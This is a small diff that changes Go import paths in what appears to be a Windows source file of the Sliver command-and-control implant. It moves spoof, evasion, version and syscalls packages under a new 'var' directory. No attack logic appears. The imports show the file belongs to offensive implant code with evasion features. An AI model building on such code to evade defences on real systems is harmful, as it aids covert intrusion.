@@ -34,15 +34,15 @@ import (
 
 	"syscall"
 
-	"4zreco/sliver/implant/sliver/spoof"
+	"4zreco/var/sliver/implant/sliver/spoof"
 
 	// {{if .Config.Evasion}}
-	"4zreco/sliver/implant/sliver/evasion"
-	"4zreco/sliver/implant/sliver/version"
+	"4zreco/var/sliver/implant/sliver/evasion"
+	"4zreco/var/sliver/implant/sliver/version"
 
 	// {{end}}
 
-	"4zreco/sliver/implant/sliver/syscalls"
+	"4zreco/var/sliver/implant/sliver/syscalls"
 	"golang.org/x/sys/windows"
 )
 
